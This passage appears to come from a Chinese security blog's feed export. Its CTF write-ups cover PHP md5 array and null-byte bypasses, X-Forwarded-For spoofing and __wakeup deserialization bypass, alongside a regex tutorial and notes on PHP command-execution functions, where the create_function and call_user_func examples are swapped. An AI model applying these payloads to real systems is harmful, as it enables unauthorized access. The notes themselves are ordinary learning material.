           <span class="hljs-keyword">echo</span> <span class="hljs-string">'骚年，继续努力吧啊~'</span>;
   &#125;</code></pre></div>

<p>试了试<code>?nctf[]=1</code>,出现了报错但是答案真就出来了</p>
<p>正儿八经的做法是<code>?nctf=1%00%23biubiubiu</code>，简单的代码审计</p>
<h2 id="bypass-again"><a href="#bypass-again" class="headerlink" title="bypass again"></a>bypass again</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'a'</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'b'</span>]))
&#123;
<span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">'a'</span>] != $_GET[<span class="hljs-string">'b'</span>])
<span class="hljs-keyword">if</span> (md5($_GET[<span class="hljs-string">'a'</span>]) == md5($_GET[<span class="hljs-string">'b'</span>]))
<span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);
<span class="hljs-keyword">else</span>
<span class="hljs-keyword">print</span> <span class="hljs-string">'Wrong.'</span>;
&#125; 
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>代码审计，get方式传递参数a和b,二者的值不同，但是md5值不同，此处又利用md5()漏洞</p>
<p> <strong>在PHP中，MD5是不能处理数组的，md5(数组)会返回null，所以md5(a[])null,md5(b[])null，md5(a[])=md5(b[])=null,这样就得到答案了。</strong> </p>
<p>payload:</p>
<p> <code>http://chinalover.sinaapp.com/web17/index.php?a[]=1&amp;b[]=3</code> </p>
<h2 id="伪装者"><a href="#伪装者" class="headerlink" title="伪装者"></a>伪装者</h2><p>bp抓包，添加<code>X-Forwarded-For=127.0.0.1</code>,发包即可</p>
<p> <strong>X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段</strong> </p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>md5</tag>
        <tag>sql</tag>
        <tag>代码审计</tag>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>反序列化</title>
    <url>/2020/03/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p>反序列化</p>
<a id="more"></a>
<p>PHP魔术方法_ wakeup()是在反序列化操作中起作用的魔法函数， 当unserialize的时候， 会检查时候存在 __ wakeup()函数, 如果存在的话，会优先调用__wakeup()函数。 </p>
<p>而<strong>wakeup()函数漏洞就是与对象的属性个数有关，如果序列化后的字符串中表示属性个数的数字与真实属性个数一致，那么就调用</strong>wakeup()函数, 如果该数字大于真实属性个数，就会绕过__wakeup()函数。</p>
<p>serialize()函数：用于序列化对象或数组，并返回一个字符串。序列化对象后， 可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。</p>
<p>unserialize()函数：用于将通过serialize()函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。</p>
<p>举例说明</p>
<div class="hljs"><pre><code>&lt;?php
class Student{
public $full_name = &apos;zhangsan&apos;;
public $score = 150;
public $grades = array();

function __wakeup() {
echo &quot;__wakeup is invoked&quot;;
}
}

$s = new Student();
var_dump(serialize($s));
?&gt;</code></pre></div><hr>
<div class="hljs"><pre><code>O:7:&quot;Student&quot;:3:{s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:{}}</code></pre></div><p>各个符号的含义<br><strong>变量类型：类名长度（字节）：类名：属性数量：{属性名类型：属性名长度：属性名：属性值类型：属性值长度：属性值内容}</strong></p>
<p>其中在Stuedent类后面有一个数字3，整个3表示的就是Student类存在3个属性。<br>wakeup()漏洞就是与整个属性个数值有关。<strong>当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。</strong></p>
<p>当我们将上述的序列化的字符串中的对象属性个数修改为5，变为<br>O:7:”Student”:5:{s:9:”full_name”;s:8:”zhangsan”;s:5:”score”;i:150;s:6:”grades”;a:0:{}}</p>
<p>最后执行运行的代码如下:</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span></span>&#123;
<span class="hljs-keyword">public</span> $full_name = <span class="hljs-string">'zhangsan'</span>;
<span class="hljs-keyword">public</span> $score = <span class="hljs-number">150</span>;
<span class="hljs-keyword">public</span> $grades = <span class="hljs-keyword">array</span>();

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span> </span>&#123;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"__wakeup is invoked"</span>;
&#125;
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>&#123;
var_dump(<span class="hljs-keyword">$this</span>);
&#125;
&#125;

$s = <span class="hljs-keyword">new</span> Student();
$stu = unserialize(<span class="hljs-string">'O:7:"Student":5:&#123;s:9:"full_name";s:8:"zhangsan";s:5:"score";i:150;s:6:"grades";a:0:&#123;&#125;&#125;'</span>);
<span class="hljs-meta">?&gt;</span></code></pre></div>


<h2 id="举例说明"><a href="#举例说明" class="headerlink" title="举例说明"></a>举例说明</h2><p>题目</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;
<span class="hljs-keyword">public</span> $flag = <span class="hljs-string">'111'</span>;
<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span></span>&#123;
<span class="hljs-keyword">exit</span>(<span class="hljs-string">'bad requests'</span>);
&#125;
?code=</code></pre></div>

<hr>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;  <span class="hljs-comment">//定义一个名为xctf的类</span>
<span class="hljs-keyword">public</span> $flag = <span class="hljs-string">'111'</span>;<span class="hljs-comment">//定义一个公有的类属性$flag，值为111</span>
<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-comment">//定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本</span>
<span class="hljs-keyword">exit</span>(<span class="hljs-string">'bad requests'</span>);
&#125;
&#125;
$test = <span class="hljs-keyword">new</span> xctf();   <span class="hljs-comment">//使用new运算符来实例化该类（xctf）的对象为test</span>
<span class="hljs-keyword">echo</span>(serialize($test));   <span class="hljs-comment">//输出被序列化的对象（test）</span>
<span class="hljs-meta">?&gt;</span></code></pre></div>
<p>输出结果</p>
<div class="hljs"><pre><code>O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code></pre></div><p>我们要反序列化xctf类的同时还要绕过wakeup方法的执行（如果不绕过wakeup()方法，那么将会输出bad requests并退出脚本），wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。因此，需要修改序列化字符串中的属性个数：<br>当我们将上述的序列化的字符串中的对象属性个数由真实值1修改为2，即如下所示：</p>
<div class="hljs"><pre><code>O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code></pre></div><p>访问url?code=O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>unserialize</tag>
      </tags>
  </entry>
  <entry>
    <title>正则表达式</title>
    <url>/2020/11/01/preg/</url>
    <content><![CDATA[<p>在一些代码审计的题目当中经常会出现使用正则表达过滤字符串的情况，所以有必要系统的学习一下！</p>
<a id="more"></a>

<h1 id="什么是正则表达式"><a href="#什么是正则表达式" class="headerlink" title="什么是正则表达式"></a>什么是正则表达式</h1><p><a href="https://www.runoob.com/regexp/regexp-example.html" target="_blank" rel="noopener">详情见这</a></p>
<p>菜鸡教程中介绍的很详细。</p>
<h2 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h2><p>许多元字符要求在试图匹配它们时特别对待。若要匹配这些特殊字符，必须首先使字符”转义”，即，将反斜杠字符<strong>\</strong> 放在它们前面。下表列出了正则表达式中的特殊字符：</p>
<table>
<thead>
<tr>
<th align="left">特别字符</th>
<th align="right">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">$</td>
<td align="right">匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\n’ 或 ‘\r’。要匹配 $ 字符本身，请使用 \$。</td>
</tr>
<tr>
<td align="left">( )</td>
<td align="right">标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用。要匹配这些字符，请使用 ( 和 )。</td>
</tr>
<tr>
<td align="left">*</td>
<td align="right">匹配前面的子表达式零次或多次。要匹配 * 字符，请使用 \*。</td>
</tr>
<tr>
<td align="left">+</td>
<td align="right">匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 \+。</td>
</tr>
<tr>
<td align="left">.</td>
<td align="right">匹配除换行符 \n 之外的任何单字符。要匹配 . ，请使用 \. 。</td>
</tr>
<tr>
<td align="left">[</td>
<td align="right">标记一个中括号表达式的开始。要匹配 [，请使用\[。</td>
</tr>
<tr>
<td align="left">?</td>
<td align="right">匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用 ?。</td>
</tr>
<tr>
<td align="left">\</td>
<td align="right">将下一个字符标记为或特殊字符、或原义字符、或向后引用、或八进制转义符。例如， ‘n’ 匹配字符 ‘n’。’\n’ 匹配换行符。序列 ‘\‘ 匹配 “&quot;，而 ‘(‘ 则匹配 “(“。</td>
</tr>
<tr>
<td align="left">^</td>
<td align="right">匹配输入字符串的开始位置，除非在方括号表达式中使用，当该符号在方括号表达式中使用时，表示不接受该方括号表达式中的字符集合。要匹配 ^ 字符本身，请使用 ^。</td>
</tr>
<tr>
<td align="left">{</td>
<td align="right">标记限定符表达式的开始。要匹配 {，请使用 \{。</td>
</tr>
<tr>
<td align="left">|</td>
<td align="right">指明两项之间的一个选择。要匹配 |，请使用 \</td>
</tr>
</tbody></table>
<h2 id="限定符"><a href="#限定符" class="headerlink" title="限定符"></a>限定符</h2><p>限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有 <strong>*** 或 **+</strong> 或 <strong>?</strong> 或 <strong>{n}</strong> 或 <strong>{n,}</strong> 或 <strong>{n,m}</strong> 共6种。</p>
<p>正则表达式的限定符有：</p>
<table>
<thead>
<tr>
<th align="left">字符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">*</td>
<td>匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。</td>
</tr>
<tr>
<td align="left">+</td>
<td>匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。</td>
</tr>
<tr>
<td align="left">?</td>
<td>匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 、 “does” 中的 “does” 、 “doxy” 中的 “do” 。? 等价于 {0,1}。</td>
</tr>
<tr>
<td align="left">{n}</td>
<td>n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。</td>
</tr>
<tr>
<td align="left">{n,}</td>
<td>n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。</td>
</tr>
<tr>
<td align="left">{n,m}</td>
<td>m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。</td>
</tr>
</tbody></table>
<h1 id="常用的正则表达式及含义"><a href="#常用的正则表达式及含义" class="headerlink" title="常用的正则表达式及含义"></a>常用的正则表达式及含义</h1><p><a href="http://c.runoob.com/front-end/854" target="_blank" rel="noopener">参考</a></p>
<div class="hljs"><pre><code class="hljs markdown">一、校验数字的表达式

<span class="hljs-bullet">1. </span>数字：^[0-9]*$			// ^表示字符的开始，$表示结束  [0-9] 表示字符串中的字符在0-9中

<span class="hljs-bullet">2. </span>n位的数字：^\d&#123;n&#125;$    // \d与[0-9]等价 ，&#123;n&#125; n表示匹配n次，所以表示匹配n位数

<span class="hljs-bullet">3. </span>至少n位的数字：^\d&#123;n,&#125;$      //&#123;n,&#125;至少n次

<span class="hljs-bullet">4. </span>m-n位的数字：^\d&#123;m,n&#125;$     //&#123;n,m&#125;  n-m次

<span class="hljs-bullet">5. </span>零和非零开头的数字：^(0|[<span class="hljs-string">1-9</span>][<span class="hljs-symbol">0-9</span>]*)$  // | 是或者意思，表示匹配左右两个子表达式其中一个都可以

<span class="hljs-bullet">6. </span>非零开头的最多带两位小数的数字：^([<span class="hljs-string">1-9</span>][<span class="hljs-symbol">0-9</span>]*)+(.[<span class="hljs-string">0-9</span>]&#123;1,2&#125;)?$    // +匹配前面的表达式一次或多次 (.[<span class="hljs-string">0-9</span>]&#123;1,2&#125;)? 表示匹配  (.[<span class="hljs-string">0-9</span>]&#123;1,2&#125;)一次或零次这子表达式代表的是0.[<span class="hljs-string">1-9</span>]或者0.[<span class="hljs-string">0-9</span>][<span class="hljs-symbol">1-9</span>]

<span class="hljs-bullet">7. </span>带1-2位小数的正数或负数：^(\-)?\d+(\.\d&#123;1,2&#125;)?$     // (\-)? 匹配一次或零次负号 

<span class="hljs-bullet">8. </span>正数、负数、和小数：^(\-|\+)?\d+(\.\d+)?$     // \- \+ \.是将特殊字符转义

<span class="hljs-bullet">9. </span>有两位小数的正实数：^[0-9]+(.[0-9]&#123;2&#125;)?$    

<span class="hljs-bullet">10. </span>有1~3位小数的正实数：^[0-9]+(.[0-9]&#123;1,3&#125;)?$

<span class="hljs-bullet">11. </span>非零的正整数：^[<span class="hljs-string">1-9</span>]\d<span class="hljs-emphasis">*$ 或 ^([1-9][0-9]*</span>)&#123;1,3&#125;$ 或 ^\+?[<span class="hljs-string">1-9</span>][<span class="hljs-symbol">0-9</span>]*$   // [1-9] 控制非零

<span class="hljs-bullet">12. </span>非零的负整数：^\-[<span class="hljs-string">1-9</span>][<span class="hljs-symbol"></span>]0-9"<span class="hljs-emphasis">*$ 或 ^-[1-9]\d*</span>$  //一下的表达式的含义可以以此类推（感觉不是很常用）

<span class="hljs-bullet">13. </span>非负整数：^\d+$ 或 ^[1-9]\d*|0$

<span class="hljs-bullet">14. </span>非正整数：^-[1-9]\d*|0$ 或 ^((-\d+)|(0+))$

<span class="hljs-bullet">15. </span>非负浮点数：^\d+(\.\d+)?$ 或 ^[1-9]\d<span class="hljs-emphasis">*\.\d*</span>|0\.\d<span class="hljs-emphasis">*[1-9]\d*</span>|0?\.0+|0$

<span class="hljs-bullet">16. </span>非正浮点数：^((-\d+(\.\d+)?)|(0+(\.0+)?))$ 或 ^(-([1-9]\d<span class="hljs-emphasis">*\.\d*</span>|0\.\d<span class="hljs-emphasis">*[1-9]\d*</span>))|0?\.0+|0$

<span class="hljs-bullet">17. </span>正浮点数：^[<span class="hljs-string">1-9</span>]\d<span class="hljs-emphasis">*\.\d*</span>|0\.\d<span class="hljs-emphasis">*[1-9]\d*</span>$ 或 ^(([<span class="hljs-string">0-9</span>]+\.[<span class="hljs-string">0-9</span>]<span class="hljs-emphasis">*[1-9][0-9]*</span>)|([<span class="hljs-string">0-9</span>]<span class="hljs-emphasis">*[1-9][0-9]*</span>\.[<span class="hljs-string">0-9</span>]+)|([<span class="hljs-string">0-9</span>]<span class="hljs-emphasis">*[1-9][0-9]*</span>))$

<span class="hljs-bullet">18. </span>负浮点数：^-([<span class="hljs-string">1-9</span>]\d<span class="hljs-emphasis">*\.\d*</span>|0\.\d<span class="hljs-emphasis">*[1-9]\d*</span>)$ 或 ^(-(([<span class="hljs-string">0-9</span>]+\.[<span class="hljs-string">0-9</span>]<span class="hljs-emphasis">*[1-9][0-9]*</span>)|([<span class="hljs-string">0-9</span>]<span class="hljs-emphasis">*[1-9][0-9]*</span>\.[<span class="hljs-string">0-9</span>]+)|([<span class="hljs-string">0-9</span>]<span class="hljs-emphasis">*[1-9][0-9]*</span>)))$

<span class="hljs-bullet">19. </span>浮点数：^(-?\d+)(\.\d+)?$ 或 ^-?([1-9]\d<span class="hljs-emphasis">*\.\d*</span>|0\.\d<span class="hljs-emphasis">*[1-9]\d*</span>|0?\.0+|0)$</code></pre></div>



<div class="hljs"><pre><code class="hljs angelscript">二、校验字符的表达式
<span class="hljs-number">1.</span> 汉字：^[\u4e00-\u9fa5]&#123;<span class="hljs-number">0</span>,&#125;$   <span class="hljs-comment">//u4e00是unicode中第一个汉字编码 u9fa5是最后一个</span>

<span class="hljs-number">2.</span> 英文和数字：^[A-Za-z0<span class="hljs-number">-9</span>]+$ 或 ^[A-Za-z0<span class="hljs-number">-9</span>]&#123;<span class="hljs-number">4</span>,<span class="hljs-number">40</span>&#125;$  <span class="hljs-comment">//[A-Za-z0-9]可以匹配大小写字母数字 </span>

<span class="hljs-number">3.</span> 长度为<span class="hljs-number">3</span><span class="hljs-number">-20</span>的所有字符：^.&#123;<span class="hljs-number">3</span>,<span class="hljs-number">20</span>&#125;$  <span class="hljs-comment">// .代表任意字符包括换行符</span>

<span class="hljs-number">4.</span> 由<span class="hljs-number">26</span>个英文字母组成的字符串：^[A-Za-z]+$

<span class="hljs-number">5.</span> 由<span class="hljs-number">26</span>个大写英文字母组成的字符串：^[A-Z]+$

<span class="hljs-number">6.</span> 由<span class="hljs-number">26</span>个小写英文字母组成的字符串：^[a-z]+$

<span class="hljs-number">7.</span> 由数字和<span class="hljs-number">26</span>个英文字母组成的字符串：^[A-Za-z0<span class="hljs-number">-9</span>]+$ <span class="hljs-comment">//与第二个表达式相同</span>

<span class="hljs-number">8.</span> 由数字、<span class="hljs-number">26</span>个英文字母或者下划线组成的字符串：^\w+$ 或 ^\w&#123;<span class="hljs-number">3</span>,<span class="hljs-number">20</span>&#125;$   <span class="hljs-comment">//  \w=[0-9A-Za-z_]</span>

<span class="hljs-number">9.</span> 中文、英文、数字包括下划线：^[\u4E00-\u9FA5A-Za-z0<span class="hljs-number">-9</span>_]+$
 
<span class="hljs-number">10.</span> 中文、英文、数字但不包括下划线等符号：^[\u4E00-\u9FA5A-Za-z0<span class="hljs-number">-9</span>]+$ 或 ^[\u4E00-\u9FA5A-Za-z0<span class="hljs-number">-9</span>]&#123;<span class="hljs-number">2</span>,<span class="hljs-number">20</span>&#125;$
 
<span class="hljs-number">11.</span> 可以输入含有^%&amp;<span class="hljs-string">',;=?$\"等字符：[^%&amp;'</span>,;=?$\x22]+ 

<span class="hljs-number">12</span> 禁止输入含有~的字符：[^~\x22]+  <span class="hljs-comment">//这里的 ^是非的意思</span></code></pre></div>

<p>下面这些就不一一解释了，实在太多了有的还是重复。</p>
<div class="hljs"><pre><code class="hljs markdown">三、特殊需求表达式
<span class="hljs-bullet">1. </span>Email地址：^\w+([-+.]\w+)<span class="hljs-emphasis">*@\w+([-.]\w+)*</span>\.\w+([-.]\w+)*$

<span class="hljs-bullet">2. </span>域名：[<span class="hljs-string">a-zA-Z0-9</span>][<span class="hljs-symbol">-a-zA-Z0-9</span>]&#123;0,62&#125;(/.[<span class="hljs-string">a-zA-Z0-9</span>][<span class="hljs-symbol">-a-zA-Z0-9</span>]&#123;0,62&#125;)+/.?

<span class="hljs-bullet">3. </span>InternetURL：[a-zA-z]+://[^\s]<span class="hljs-emphasis">* 或 ^http://([\w-]+\.)+[\w-]+(/[\w-./?%&amp;=]*</span>)?$

<span class="hljs-bullet">4. </span>手机号码：^(13[0-9]|14[5|7]|15[0|1|2|3|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\d&#123;8&#125;$

<span class="hljs-bullet">5. </span>电话号码("XXX-XXXXXXX"、"XXXX-XXXXXXXX"、"XXX-XXXXXXX"、"XXX-XXXXXXXX"、"XXXXXXX"和"XXXXXXXX)：^(\(\d&#123;3,4&#125;-)|\d&#123;3.4&#125;-)?\d&#123;7,8&#125;$

<span class="hljs-bullet">6. </span>国内电话号码(0511-4405222、021-87888822)：\d&#123;3&#125;-\d&#123;8&#125;|\d&#123;4&#125;-\d&#123;7&#125;

<span class="hljs-bullet">7. </span>身份证号(15位、18位数字)：^\d&#123;15&#125;|\d&#123;18&#125;$

<span class="hljs-bullet">8. </span>短身份证号码(数字、字母x结尾)：^([0-9])&#123;7,18&#125;(x|X)?$ 或 ^\d&#123;8,18&#125;|[0-9x]&#123;8,18&#125;|[0-9X]&#123;8,18&#125;?$

<span class="hljs-bullet">9. </span>帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：^[<span class="hljs-string">a-zA-Z</span>][<span class="hljs-symbol">a-zA-Z0-9_</span>]&#123;4,15&#125;$

<span class="hljs-bullet">10. </span>密码(以字母开头，长度在6~18之间，只能包含字母、数字和下划线)：^[a-zA-Z]\w&#123;5,17&#125;$

<span class="hljs-bullet">11. </span>强密码(必须包含大小写字母和数字的组合，不能使用特殊字符，长度在8-10之间)：^(?=.<span class="hljs-emphasis">*\d)(?=.*</span>[a-z])(?=.*[A-Z]).&#123;8,10&#125;$

<span class="hljs-bullet">12. </span>日期格式：^\d&#123;4&#125;-\d&#123;1,2&#125;-\d&#123;1,2&#125;

<span class="hljs-bullet">13. </span>一年的12个月(01～09和1～12)：^(0?[1-9]|1[0-2])$

<span class="hljs-bullet">14. </span>一个月的31天(01～09和1～31)：^((0?[1-9])|((1|2)[0-9])|30|31)$

14 钱的输入格式：

15    1.有四种钱的表示形式我们可以接受:"10000.00" 和 "10,000.00", 和没有 "分" 的 "10000" 和 "10,000"：^[<span class="hljs-string">1-9</span>][<span class="hljs-symbol">0-9</span>]*$ 

16    2.这表示任意一个不以0开头的数字,但是,这也意味着一个字符"0"不通过,所以我们采用下面的形式：^(0|[<span class="hljs-string">1-9</span>][<span class="hljs-symbol">0-9</span>]*)$ 

17    3.一个0或者一个不以0开头的数字.我们还可以允许开头有一个负号：^(0|-?[<span class="hljs-string">1-9</span>][<span class="hljs-symbol">0-9</span>]*)$ 

18    4.这表示一个0或者一个可能为负的开头不为0的数字.让用户以0开头好了.把负号的也去掉,因为钱总不能是负的吧.下面我们要加的是说明可能的小数部分：^[0-9]+(.[0-9]+)?$ 

19    5.必须说明的是,小数点后面至少应该有1位数,所以"10."是不通过的,但是 "10" 和 "10.2" 是通过的：^[0-9]+(.[0-9]&#123;2&#125;)?$ 

20    6.这样我们规定小数点后面必须有两位,如果你认为太苛刻了,可以这样：^[0-9]+(.[0-9]&#123;1,2&#125;)?$ 

21    7.这样就允许用户只写一位小数.下面我们该考虑数字中的逗号了,我们可以这样：^[0-9]&#123;1,3&#125;(,[0-9]&#123;3&#125;)*(.[0-9]&#123;1,2&#125;)?$ 

22    8.1到3个数字,后面跟着任意个 逗号+3个数字,逗号成为可选,而不是必须：^([0-9]+|[0-9]&#123;1,3&#125;(,[0-9]&#123;3&#125;)*)(.[0-9]&#123;1,2&#125;)?$ 

23    备注：这就是最终结果了,别忘了"+"可以用"*"替代如果你觉得空字符串也可以接受的话(奇怪,为什么?)最后,别忘了在用函数时去掉去掉那个反斜杠,一般的错误都在这里

24 xml文件：^([<span class="hljs-string">a-zA-Z</span>]+-?)+[<span class="hljs-string">a-zA-Z0-9</span>]+\\.[<span class="hljs-string">x|X</span>][<span class="hljs-symbol">m|M</span>][<span class="hljs-string">l|L</span>]$

25 中文字符的正则表达式：[\u4e00-\u9fa5]

26 双字节字符：[^\x00-\xff]    (包括汉字在内，可以用来计算字符串的长度(一个双字节字符长度计2，ASCII字符计1))

27 空白行的正则表达式：\n\s*\r    (可以用来删除空白行)

28 HTML标记的正则表达式：<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">(\S*?)[^</span>&gt;</span></span>]<span class="hljs-emphasis">*&gt;.*</span>?<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">\1</span>&gt;</span></span>|<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">.*?</span> /&gt;</span></span>    (网上流传的版本太糟糕，上面这个也仅仅能部分，对于复杂的嵌套标记依旧无能为力)

29 首尾空白字符的正则表达式：^\s<span class="hljs-emphasis">*|\s*</span>$或(^\s<span class="hljs-emphasis">*)|(\s*</span>$)    (可以用来删除行首行尾的空白字符(包括空格、制表符、换页符等等)，非常有用的表达式)

30 腾讯QQ号：[<span class="hljs-string">1-9</span>][<span class="hljs-symbol">0-9</span>]&#123;4,&#125;    (腾讯QQ号从10000开始)

31 中国邮政编码：[1-9]\d&#123;5&#125;(?!\d)    (中国邮政编码为6位数字)

32 IP地址：\d+\.\d+\.\d+\.\d+    (提取IP地址时有用)

33 IP地址：((?:(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d)\\.)&#123;3&#125;(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d)) 

34 将url的协议，主机名，端口号，文件路径放到数组中:
var str = "http://www.runoob.com:80/html/html-tutorial.html";
var patt1 = /(\w+):\/\/([^/:]+)(:\d<span class="hljs-emphasis">*)?([^# ]*</span>)/;   //四个子表达式组合在一起，(\w+): 匹配字符串开始到: ([^/:]+) 匹配非/ 非:后的内容  (:\d<span class="hljs-emphasis">*)? 匹配:后的若干数字且表达式重复一次或多次  ([^# ]*</span>) 匹配不包括#或空格字符的任何字符序列</code></pre></div>



<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>正则表达式的功能还是很强大的，想要写出能准确匹配目标的表达式还是需要认真学习的，但是代码审计中的要求没那么严格，只需要能看懂表达式匹配了哪些内容即可。</p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title>rcm</title>
    <url>/2020/11/29/rcm/</url>
    <content><![CDATA[<p>看到一个关于任意命令执行的视频后感觉很有意思，可以记录以下，以后可能会用到。</p>
<a id="more"></a>

<h1 id="php中存在命令执行的常见函数"><a href="#php中存在命令执行的常见函数" class="headerlink" title="php中存在命令执行的常见函数"></a>php中存在命令执行的常见函数</h1><h2 id="1-system"><a href="#1-system" class="headerlink" title="1.system"></a>1.system</h2><div class="hljs"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-meta-keyword">$last</span>_line = system('ls', $return_var);</span>
<span class="hljs-keyword">system</span>() 会将输出内容直接印出, 所以若于网页, 会将所有回传内容都显示于页面上.
<span class="hljs-meta"><span class="hljs-meta-keyword">$last</span>_line: 只能取得最后一行的内容</span>
<span class="hljs-meta"><span class="hljs-meta-keyword">$return</span>_var: 取得系统状态回传码</span></code></pre></div>



<h2 id="2-shell-exec"><a href="#2-shell-exec" class="headerlink" title="2.shell_exec"></a>2.shell_exec</h2><div class="hljs"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-meta-keyword">$output</span> = shell_exec('ls');</span>
<span class="hljs-meta"><span class="hljs-meta-keyword">$output</span>: 回传内容都会存于此变数中(储存成纯文字内容), 不会直接秀在页面上.</span></code></pre></div>



<h2 id="3-exec"><a href="#3-exec" class="headerlink" title="3.exec"></a>3.exec</h2><div class="hljs"><pre><code class="hljs gams">exec(<span class="hljs-string">'ls'</span>, <span class="hljs-symbol">$</span>output, <span class="hljs-symbol">$</span>return_var);
<span class="hljs-meta"><span class="hljs-meta-keyword">$output</span>: 回传内容都会存于此变数中(储存成阵列), 不会直接秀在页面上.</span>
<span class="hljs-meta"><span class="hljs-meta-keyword">$return</span>_var: 取得系统状态回传码</span></code></pre></div>



<h2 id="3-eval"><a href="#3-eval" class="headerlink" title="3.eval"></a>3.eval</h2><p>eval执行命令的原理与上面几个不同，eval 会把字符串作为PHP代码执行</p>
<p>例如</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">eval</span>(<span class="hljs-string">"phpinfo();"</span>);
<span class="hljs-keyword">eval</span>(<span class="hljs-string">"system('dir');"</span>);
<span class="hljs-keyword">eval</span>(<span class="hljs-string">"echo 'hello!';"</span>);

<span class="hljs-comment">//注意：因为是将字符串当作php代码执行，所以相当于双引号中的代码再次执行了一次，所以里面的代码一定要符合php语法规则</span></code></pre></div>



<h2 id="4-create-function"><a href="#4-create-function" class="headerlink" title="4.create_function"></a>4.create_function</h2><p><a href="https://www.php.net/manual/zh/function.create-function.php" target="_blank" rel="noopener">php官方手册</a></p>
<p>用法如下</p>
<div class="hljs"><pre><code class="hljs autoit">$a = <span class="hljs-string">'system'</span><span class="hljs-comment">;</span>
$b = <span class="hljs-string">'dir'</span><span class="hljs-comment">;</span>
$c = <span class="hljs-string">'assert'</span><span class="hljs-comment">;</span>
$d = <span class="hljs-string">'phpinfo()'</span><span class="hljs-comment">;</span>
call_user_func($a,$b)<span class="hljs-comment">;</span>
call_user_func($c,$d)<span class="hljs-comment">;</span></code></pre></div>

<h2 id="5-call-user-func"><a href="#5-call-user-func" class="headerlink" title="5.call_user_func"></a>5.call_user_func</h2><div class="hljs"><pre><code class="hljs php">$a = create_function(<span class="hljs-string">'$code'</span>,<span class="hljs-string">'echo $code;'</span>);
$b = <span class="hljs-string">'hello'</span>;
$a($b);
$a = <span class="hljs-string">'phpinfo();'</span>;
$b = create_function(<span class="hljs-string">''</span>,$a);
$b();

